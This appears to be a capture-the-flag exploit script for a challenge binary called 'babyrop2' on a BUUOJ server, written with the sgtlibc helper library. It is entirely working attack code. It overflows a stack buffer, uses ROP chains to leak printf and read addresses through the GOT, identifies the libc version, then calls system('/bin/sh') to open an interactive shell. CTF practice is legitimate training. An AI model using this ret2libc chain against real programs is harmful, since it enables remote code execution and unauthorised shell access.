import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True, file='./babyrop2', remote='node4.buuoj.cn:25462',
    auto_load=True, auto_show_rop=True, auto_show_summary=True,
    auto_start_game=True
))
s = sgtlibc.Searcher()
elf = client.elf
payload_exp = b'a' * (28 + 4) + p00(0xdeadbeef)  # overflow position
def leak(func: str):
    payload = payload_exp + p00(elf.rop['rdi']) + p00(elf.got[func]) + \
        p00(elf.plt['printf']) + p00(elf.symbols['main'])
    sl(payload)
    rl()
    data = rc(6).ljust(8, b'\0')
    data = uc(data)
    s.add_condition(func, data)
    return data
leak('printf')
leak('read')
data = s.dump(db_index=2)  # choose your system index
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')
payload = payload_exp + p00(elf.rop['rdi']) + p00(binsh_addr) + \
    p00(system_addr) + p00(0xdeadbeef)
sl(payload)
interactive()
